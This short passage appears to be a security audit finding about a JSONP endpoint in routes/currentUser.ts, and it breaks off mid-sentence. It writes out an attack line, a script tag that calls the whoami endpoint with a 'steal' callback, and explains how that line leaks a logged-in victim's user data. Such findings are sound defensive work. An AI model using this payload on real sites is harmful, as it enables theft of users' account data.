  title: JSONP Cross-Origin User Data Leakage — routes/currentUser.ts:54
  scenario: 'An attacker hosts a page that includes `<script src="https://target/rest/user/whoami?callback=steal">`. When
    an authenticated victim visits this page, their browser sends the session cookie and the server at `routes/currentUser.ts:54`
    wraps the user object in the callback: `steal({user:{id:1,email:''admin@...''}})`. The attacker''s page executes the callback
